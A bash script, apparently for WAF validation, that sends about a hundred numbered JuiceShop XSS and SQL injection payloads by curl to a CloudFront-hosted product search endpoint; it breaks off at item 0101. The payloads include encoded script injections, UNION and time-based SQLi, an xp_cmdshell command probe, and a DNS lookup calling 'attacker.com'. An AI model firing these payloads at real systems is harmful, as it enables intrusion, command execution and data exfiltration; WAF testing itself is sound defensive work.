#!/usr/bin/env bash
# GET /rest/products/search with payload in QUERY STRING (?q=<encoded>)
# All 344 JuiceShop payloads — sent via curl GET with URL-encoded q parameter
# Purpose: baseline GET shape that produced rich verdicts (validate_log_baseline13_get.json)
# Generated from waf_requirements_get.yaml

USER_AGENT="dlpaasrngb6ue.cloudfront.net"
HOST="https://dlpaasrngb6ue.cloudfront.net"
URI="/rest/products/search"

echo "=== juiceshop-0001 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>alert(1)</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0002 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%253Cscript%253Ealert(1)%253C/script%253E'
curl -sk -i -m 15 "$HOST$URI?q=%25253Cscript%25253Ealert%281%29%25253C%2Fscript%25253E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0003 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&lt;script&gt;alert(1)&lt;/script&gt;'
curl -sk -i -m 15 "$HOST$URI?q=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0004 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<scr<script>ipt>alert(1)</scr</script>ipt>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscr%3C%2Fscript%3Eipt%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0005 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>alert&#40;1&#41;</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Ealert%26%2340%3B1%26%2341%3B%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0006 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>alert\\x281\\x29</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Ealert%5C%5Cx281%5C%5Cx29%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0007 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>alert\\u00281\\u0029</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Ealert%5C%5Cu00281%5C%5Cu0029%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0008 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%u003Cscript%u003Ealert(1)%u003C/script%u003E'
curl -sk -i -m 15 "$HOST$URI?q=%25u003Cscript%25u003Ealert%281%29%25u003C%2Fscript%25u003E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0009 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,49,41))%3C/script%3E'
curl -sk -i -m 15 "$HOST$URI?q=%253Cscript%253Eeval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C49%2C41%29%29%253C%2Fscript%253E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0010 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%3cscript%3ealert(1)%3c%2fscript%3e'
curl -sk -i -m 15 "$HOST$URI?q=%253cscript%253ealert%281%29%253c%252fscript%253e" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0011 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%3Csvg%20onload%3D%22confirm%28document.domain%29%22%3E'
curl -sk -i -m 15 "$HOST$URI?q=%253Csvg%2520onload%253D%2522confirm%2528document.domain%2529%2522%253E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0012 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'
curl -sk -i -m 15 "$HOST$URI?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert%281%29%253E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0013 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E'
curl -sk -i -m 15 "$HOST$URI?q=%253Ciframe%2520src%253D%2522javascript%253Aalert%281%29%2522%253E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0014 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E'
curl -sk -i -m 15 "$HOST$URI?q=%253Cscrscriptipt%253Ealert%25281%2529%253C%252Fscrscriptipt%253E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0015 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%u003Cscript%u003Ealert(1)%u003C%2Fscript%u003E'
curl -sk -i -m 15 "$HOST$URI?q=%25u003Cscript%25u003Ealert%281%29%25u003C%252Fscript%25u003E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0016 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '"><script>alert(1)</script>'
curl -sk -i -m 15 "$HOST$URI?q=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0017 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<svg/onload=alert(1)>'
curl -sk -i -m 15 "$HOST$URI?q=%3Csvg%2Fonload%3Dalert%281%29%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0018 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<iframe src="javascript:alert(1)">'
curl -sk -i -m 15 "$HOST$URI?q=%3Ciframe%20src%3D%22javascript%3Aalert%281%29%22%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0019 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<IMG SRC="javascript:alert('\''XSS'\'');">'
curl -sk -i -m 15 "$HOST$URI?q=%3CIMG%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0020 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<svg><script xlink:href=data:,alert(1)>'
curl -sk -i -m 15 "$HOST$URI?q=%3Csvg%3E%3Cscript%20xlink%3Ahref%3Ddata%3A%2Calert%281%29%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0021 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<math><mi//xlink:href="data:x,alert(1)">'
curl -sk -i -m 15 "$HOST$URI?q=%3Cmath%3E%3Cmi%2F%2Fxlink%3Ahref%3D%22data%3Ax%2Calert%281%29%22%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0022 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>window </script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3Ewindow%20%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0023 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '"><img src=x onerror=alert(1)>'
curl -sk -i -m 15 "$HOST$URI?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0024 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
curl -sk -i -m 15 "$HOST$URI?q=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0025 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E'
curl -sk -i -m 15 "$HOST$URI?q=%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0026 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<scr<script>ipt>alert(1)</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0027 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<scri%00pt>alert(1)</scri%00pt>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscri%2500pt%3Ealert%281%29%3C%2Fscri%2500pt%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0028 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<script>\\u0061lert(1)</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscript%3E%5C%5Cu0061lert%281%29%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0029 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<iframe/src=javascript:alert(1)>'
curl -sk -i -m 15 "$HOST$URI?q=%3Ciframe%2Fsrc%3Djavascript%3Aalert%281%29%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0030 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<svg%0Aonload=alert(1)>'
curl -sk -i -m 15 "$HOST$URI?q=%3Csvg%250Aonload%3Dalert%281%29%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0031 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '"><img src=x o%6ener%72=alert(1)>'
curl -sk -i -m 15 "$HOST$URI?q=%22%3E%3Cimg%20src%3Dx%20o%256ener%2572%3Dalert%281%29%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0032 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%3Cscript%3Ealert(1)%3C%2Fscript%3E'
curl -sk -i -m 15 "$HOST$URI?q=%253Cscript%253Ealert%281%29%253C%252Fscript%253E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0033 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%3Csvg%2Fonload%3Dalert(1)%3E'
curl -sk -i -m 15 "$HOST$URI?q=%253Csvg%252Fonload%253Dalert%281%29%253E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0034 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<img src=x onerror=alert(1)>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0035 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '&lt;img src=x onerror=alert(1)&gt;'
curl -sk -i -m 15 "$HOST$URI?q=%26lt%3Bimg%20src%3Dx%20onerror%3Dalert%281%29%26gt%3B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0036 | tuning=base64 | method=GET-querystring ==="
printf '    payload: %s\n' 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
curl -sk -i -m 15 "$HOST$URI?q=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0037 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscr%3C%21--%20--%3Eipt%3Ealert%281%29%3C%2Fscr%3C%21--%20--%3Eipt%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0038 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '?a=<scr&b=ipt>alert(1)</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Fa%3D%3Cscr%26b%3Dipt%3Ealert%281%29%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0039 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '<scr + ipt>alert(1)</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3Cscr%20%2B%20ipt%3Ealert%281%29%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0040 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '< + script>alert(1)</script>'
curl -sk -i -m 15 "$HOST$URI?q=%3C%20%2B%20script%3Ealert%281%29%3C%2Fscript%3E" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0041 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR '\'' + 1=1 + --'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%20%27%20%2B%201%3D1%20%2B%20--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0042 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' 'id='\'' OR '\''&id=1=1--'
curl -sk -i -m 15 "$HOST$URI?q=id%3D%27%20OR%20%27%26id%3D1%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0043 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''/**/OR/**/1=1--'
curl -sk -i -m 15 "$HOST$URI?q=%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0044 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR '\''1'\''='\''1'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%20%271%27%3D%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0045 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR 1=1 --'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%201%3D1%20--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0046 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR 1=1#'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%201%3D1%23" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0047 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'') OR ('\''1'\''='\''1'
curl -sk -i -m 15 "$HOST$URI?q=%27%29%20OR%20%28%271%27%3D%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0048 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' 'admin'\'' --'
curl -sk -i -m 15 "$HOST$URI?q=admin%27%20--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0049 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' 'admin'\'' #'
curl -sk -i -m 15 "$HOST$URI?q=admin%27%20%23" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0050 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27%20OR%201=1--'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2520OR%25201%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0051 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27%20OR%20%271%27=%271'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2520OR%2520%25271%2527%3D%25271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0052 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27%20OR%20%271%27=%271%27--'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2520OR%2520%25271%2527%3D%25271%2527--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0053 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%2527%2520OR%25201%253D1--'
curl -sk -i -m 15 "$HOST$URI?q=%252527%252520OR%2525201%25253D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0054 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27OR+1%3D1--'
curl -sk -i -m 15 "$HOST$URI?q=%2527OR%2B1%253D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0055 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27+OR+1%3D1--'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2BOR%2B1%253D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0056 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27--+'
curl -sk -i -m 15 "$HOST$URI?q=%2527--%2B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0057 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%27%23'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2523" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0058 | tuning=xss | method=GET-querystring ==="
printf '    payload: %s\n' '%2F%2A%2A%2F'
curl -sk -i -m 15 "$HOST$URI?q=%252F%252A%252A%252F" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0059 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27)%20OR%20(%271%27=%271'
curl -sk -i -m 15 "$HOST$URI?q=%2527%29%2520OR%2520%28%25271%2527%3D%25271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0060 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'')%20OR%20('\''1'\''='\''1'
curl -sk -i -m 15 "$HOST$URI?q=%27%29%2520OR%2520%28%271%27%3D%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0061 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''||'\''1'\''='\''1'
curl -sk -i -m 15 "$HOST$URI?q=%27%7C%7C%271%27%3D%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0062 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%df'\'' OR 1=1--'
curl -sk -i -m 15 "$HOST$URI?q=%25df%27%20OR%201%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0063 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'';WAITFOR DELAY '\''0:0:5'\''--'
curl -sk -i -m 15 "$HOST$URI?q=%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0064 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' AND SLEEP(5)--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20AND%20SLEEP%285%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0065 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''||UTL_INADDR.get_host_address('\''attacker.com'\'')||'\'''
curl -sk -i -m 15 "$HOST$URI?q=%27%7C%7CUTL_INADDR.get_host_address%28%27attacker.com%27%29%7C%7C%27" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0066 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27%20OR%201%3D1%20--%20'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2520OR%25201%253D1%2520--%2520" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0067 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27)%20OR%20('\''1'\''%3D'\''1'
curl -sk -i -m 15 "$HOST$URI?q=%2527%29%2520OR%2520%28%271%27%253D%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0068 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%25%27%20OR%20%271%27%3D%271'
curl -sk -i -m 15 "$HOST$URI?q=%2525%2527%2520OR%2520%25271%2527%253D%25271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0069 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27%20OR%201=1%20--%20'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2520OR%25201%3D1%2520--%2520" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0070 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27%20UNION%20SELECT%201,2,3--'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2520UNION%2520SELECT%25201%2C2%2C3--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0071 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' 'admin%27--+'
curl -sk -i -m 15 "$HOST$URI?q=admin%2527--%2B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0072 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' 'admin%27%2f%2a%2a%2f--'
curl -sk -i -m 15 "$HOST$URI?q=admin%2527%252f%252a%252a%252f--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0073 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27/**/OR/**/1=1--'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0074 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27%2bOR%2b1%3d1--'
curl -sk -i -m 15 "$HOST$URI?q=%2527%252bOR%252b1%253d1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0075 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%60%27%20OR%201=1--'
curl -sk -i -m 15 "$HOST$URI?q=%2560%2527%2520OR%25201%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0076 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%2527%2520OR%25201%253D1--+'
curl -sk -i -m 15 "$HOST$URI?q=%252527%252520OR%2525201%25253D1--%2B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0077 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27%2b%4f%52%2b1%3d1--+'
curl -sk -i -m 15 "$HOST$URI?q=%2527%252b%254f%2552%252b1%253d1--%2B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0078 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%2527%2f%2a%2a%2f%2bOR%2b1%3D1--+'
curl -sk -i -m 15 "$HOST$URI?q=%252527%252f%252a%252a%252f%252bOR%252b1%253D1--%2B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0079 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27||CHR(65)||CHR(66)||CHR(67)--'
curl -sk -i -m 15 "$HOST$URI?q=%2527%7C%7CCHR%2865%29%7C%7CCHR%2866%29%7C%7CCHR%2867%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0080 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '0%27%20UNION%20SELECT%20null,null,null--+'
curl -sk -i -m 15 "$HOST$URI?q=0%2527%2520UNION%2520SELECT%2520null%2Cnull%2Cnull--%2B" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0081 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR 1=1--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%201%3D1--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0082 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '" OR "1"="1'
curl -sk -i -m 15 "$HOST$URI?q=%22%20OR%20%221%22%3D%221" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0083 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'')--'
curl -sk -i -m 15 "$HOST$URI?q=%27%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0084 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' UNION SELECT null,null--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20UNION%20SELECT%20null%2Cnull--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0085 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' AND 1=CAST((SELECT @@version) AS int)--'
curl -sk -i -m 15 "$HOST$URI?q=%27%20AND%201%3DCAST%28%28SELECT%20%40%40version%29%20AS%20int%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0086 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' AND EXISTS (SELECT * FROM'
curl -sk -i -m 15 "$HOST$URI?q=%27%20AND%20EXISTS%20%28SELECT%20%2A%20FROM" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0087 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\'' AND '\''1'\''='\''1'
curl -sk -i -m 15 "$HOST$URI?q=1%27%20AND%20%271%27%3D%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0088 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' 'admin'\''--'
curl -sk -i -m 15 "$HOST$URI?q=admin%27--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0089 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\'' OR '\''a'\''='\''a'
curl -sk -i -m 15 "$HOST$URI?q=%27%20OR%20%27a%27%3D%27a" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0090 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1=1'
curl -sk -i -m 15 "$HOST$URI?q=1%3D1" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0091 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\'' AND 1=0 UNION SELECT null, version() --'
curl -sk -i -m 15 "$HOST$URI?q=1%27%20AND%201%3D0%20UNION%20SELECT%20null%2C%20version%28%29%20--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0092 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\''; EXEC xp_cmdshell('\''whoami'\'') --'
curl -sk -i -m 15 "$HOST$URI?q=1%27%3B%20EXEC%20xp_cmdshell%28%27whoami%27%29%20--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0093 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\'') OR ('\''1'\''='\''1'\'' --'
curl -sk -i -m 15 "$HOST$URI?q=1%27%29%20OR%20%28%271%27%3D%271%27%20--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0094 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1'\'') AND sleep(5)--'
curl -sk -i -m 15 "$HOST$URI?q=1%27%29%20AND%20sleep%285%29--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0095 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '%27%20OR%20%271%27%3D%271'
curl -sk -i -m 15 "$HOST$URI?q=%2527%2520OR%2520%25271%2527%253D%25271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0096 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1%27%20AND%201%3D1%20--'
curl -sk -i -m 15 "$HOST$URI?q=1%2527%2520AND%25201%253D1%2520--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0097 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' '1%27)%20OR%20(%271%27%3D%271'
curl -sk -i -m 15 "$HOST$URI?q=1%2527%29%2520OR%2520%28%25271%2527%253D%25271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0098 | tuning=base64 | method=GET-querystring ==="
printf '    payload: %s\n' 'JyBPUiAnMT0nJz0nMQ=='
curl -sk -i -m 15 "$HOST$URI?q=JyBPUiAnMT0nJz0nMQ%3D%3D" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0099 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''/**/OR/**/'\''1'\''/**/=/**/'\''1'
curl -sk -i -m 15 "$HOST$URI?q=%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%2F%2A%2A%2F%3D%2F%2A%2A%2F%271" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0100 | tuning=sqli | method=GET-querystring ==="
printf '    payload: %s\n' ''\''UNION/**/SELECT/**/NULL,NULL--'
curl -sk -i -m 15 "$HOST$URI?q=%27UNION%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL--" -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0101 | tuning=sqli | method=GET-querystring ==="
